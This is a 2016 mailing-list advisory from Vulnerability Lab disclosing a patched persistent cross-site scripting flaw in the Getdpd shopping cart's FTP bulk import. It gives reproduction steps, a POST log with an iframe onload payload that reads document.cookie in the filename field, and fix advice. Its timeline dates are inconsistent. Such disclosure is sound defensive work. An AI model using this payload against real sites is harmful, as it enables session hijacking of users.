
Date: Wed, 10 Feb 2016 11:56:14 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Getdpd Bug Bounty #6 - (Import - FTP) Persistent Vulnerability

Document Title:
===============
Getdpd Bug Bounty #6 - (Import) Persistent Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1718


Release Date:
=============
2016-02-09


Vulnerability Laboratory ID (VL-ID):
====================================
1718


Common Vulnerability Scoring System:
====================================
4.4


Product & Service Introduction:
===============================
DPD is an all-in-one shopping cart and digital fulfillment service for downloadable products. Serving thousands of stores, DPD processes and 
delivers millions worth of downloads each year.

(Copy of the Vendor Homepage: https://getdpd.com/security )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research team discovered an application-side input validation web vulnerability in the official Getpdp online service web-application.


Vulnerability Disclosure Timeline:
==================================
2015-08-09: Researcher Notification & Coordination (Hadji Samir - Evolution Security GmbH)
2015-08-10: Vendor Notification (Getdpd Security Team - Bug Bounty Program)
2015-09-02: Vendor Response/Feedback (Getdpd Security Team - Bug Bounty Program)
2015-02-01: Vendor Fix/Patch (Getdpd Developer Team)
2015-02-09: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
DPD - Digital Product Delivery
Product: DPD Online Service (Web-Application) 2016 Q1


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
An application-side cross site scripting web vulnerability has been discovered in the official Getdpd online service web-application.
The security vulnerability allows remote attackers to inject own script code to the application-side of the affected application module.

The vulnerability is located in the filename value of the attachment file upload with FTP. Remote attackers with low privilege web-application 
user accounts are able to inject own malicious script code via upload file with FTP method request to the application-side. The injection point 
is the vulnerable filename parameter in the upload file with FTP and with POST  method request and the execution point is  located in attachment 
file Import Product from FTP Drop Box. The request method to https://getdpd.com/storefront/bulkimport inject is Upload file with FTP and the 
vulnerability is located to the application-side of the vulnerable online-service. The execution context is executed by the vulnerable 
notification error value.

The security risk of the application-side file validation vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 4.4. 
Exploitation of the persistent input validation web vulnerability requires a low privilege web-application user account and low or medium user interaction. 
Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent external redirects to malicious source 
and persistent manipulation of affected or connected application modules.

Request Method(s):
						[+] POST

Vulnerable Service(s):
						[+] getdpd.com
						
Vulnerable Module(s):
						[+] Import Prodcut from FTP (exp. Dropbox)

Vulnerable Input(s):
						[+] Product Name (Input Field)
						
Vulnerable Parameter(s):
						[+] notification error

Affected Module(s):
						[+] BulkImport


Proof of Concept (PoC):
=======================
The security vulnerability can be exploited by remote attackers with low privilege web-application user account and low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the vulnerability ...
1- Connect to ftp.getdpd.com with username and password 
2- Upload file with Payload name (code injection)
3- Go to https://getdpd.com/storefront/bulkimport
4- Select the file and click to Import Selected File
5- The malicious code will execute

--- PoC Session Logs [POST] ---
POST https://getdpd.com/storefront/bulkimport 
Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Content Size[4982] Mime Type[text/html]
   Request Headers:
      Host[getdpd.com]
      User-Agent[Mozilla/5.0 (X11; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[en-US,en;q=0.5]
      Accept-Encoding[gzip, deflate]
      Referer[https://getdpd.com/storefront/bulkimport]
      Cookie[_src=https://getdpd.com/product/114584/fulfillment_method/edit?id=64976&wizard=1; _ga=GA1.2.163063198.1438880403; __zlcmid=W5erEG66rmgkKt; referrer=javascript:alert(1); view-cart-button=https%3A%2F%2Fgetdpd.com%2Fimages%2Fbuy_buttons%2Fvc%2Fsolid1%2Fdpd_viewcart_2.png; symfony=4fk57k07c4c3blm6piak6rrk01; _csrf_token=5dd0e8de2f12cbf4cfdddb7af46239126a7861de; _gat=1]
      X-Forwarded-For[8.8.8.8]
      Connection[keep-alive]
   Post Data:
      _csrf_token[5dd0e8de2f12cbf4cfdddb7af46239126a7861de]
      files%5B0%5D%5Bimport%5D[1]
      files%5B0%5D%5Bsku%5D[]
      files%5B0%5D%5Bname%5D[%22%3E%3Ciframe+Src%3Dx+Onload%3Dalert%28document.cookie%29%3E+]
      files%5B0%5D%5Bprice%5D[]
      files%5B0%5D%5Bfilename%5D[%22%3E%3Ciframe+src%3Dx+onload%3Dalert%28document.cookie%29%3E+.png]
      files%5B1%5D%5Bsku%5D[]
      files%5B1%5D%5Bname%5D[A]
      files%5B1%5D%5Bprice%5D[]
      files%5B1%5D%5Bfilename%5D[a]
   Response Headers:
      Date[Mon, 10 Aug 2015 15:58:07 GMT]
      Server[Apache]
      Expires[Thu, 19 Nov 1981 08:52:00 GMT]
      Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
      Pragma[no-cache]
      P3p[CP="NOI CURa OUR NOR UNI"]
      X-Xss-Protection[1; mode=block]
      X-Frame-Options[SAMEORIGIN]
      Set-Cookie[_csrf_token=5dd0e8de2f12cbf4cfdddb7af46239126a7861de; path=/; secure]
      Vary[Accept-Encoding,User-Agent]
      Content-Encoding[gzip]
      Content-Length[4982]
      Connection[close]
      Content-Type[text/html; charset=utf-8]



PoC: Source - BulkImport (FTP Import _ DPD Shopping Cart.html)
  <div id="page-content"> 
  <div class="notification error">
    <span class="strong">Please correct the following:</span>
    "><iframe src="FTP%20Import%20%7C%20DPD%20Shopping%20Cart_files/x.html" onload="alert(document.cookie)">
 .png: No price.
  </div>  

<style type="text/css" media="screen">
tr.existing {
  background-color: #e6e6e6;
  display: none;
}
</style>
<div class="container_12">
  <div class="grid_12">
    <div class="page-header">
      <h2>Bulk FTP Import</h2>
    </div>
    <div class="grid_12">    
      <div class="well well-small">
        <p>Enter the following information into your FTP client.  
We recommend using <a href="http://filezilla-project.org/" 
target="_blank">FileZilla</a> (Windows) or <a 
href="http://cyberduck.ch/" target="_blank">Cyberduck</a> (OS 
X) if you do not already have a FTP program.</p>
        <p><em><strong>Please note:</strong> The
 FTP drop box is write-only and uploaded files will be automatically 
removed after one week.</em></p>
      </div>
<form class="form-horizontal">
      <fieldset>
        <legend>FTP Connection Information</legend>
        
        <div class="control-group">
          <label for="name" class="control-label">Host / 
Server</label>
          <div class="controls">
            <span class="input-xlarge 
uneditable-input">ftp.getdpd.com</span>
          </div>
        </div>


Reference(s):
https://getdpd.com/
https://getdpd.com/vendor
https://getdpd.com/user/profile
https://getdpd.com/subscription/history


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of the vulnerable product name value in the upload POST method request. Restrict the input and disallow usage of special chars.
Filter and setup a secure exception handling that prevents the persistent execution in the output location were the ftp file bulkimport list becomes visible. 
Disallow usage of multiple productnames as extension to prevent arbitrary file upload of webshells. Secure the type of file to secure the mechanism by manual interaction. 


Security Risk:
==============
The security risk of application-side input validation web vulnerability in the frontend of the getdpd web-application is estimated as medium. (CVSS 4.4)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Hadji Samir [samir@...lution-sec.com] [www.vulnerability-lab.com] (http://www.vulnerability-lab.com/show.php?user=Hadji%20Samir)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


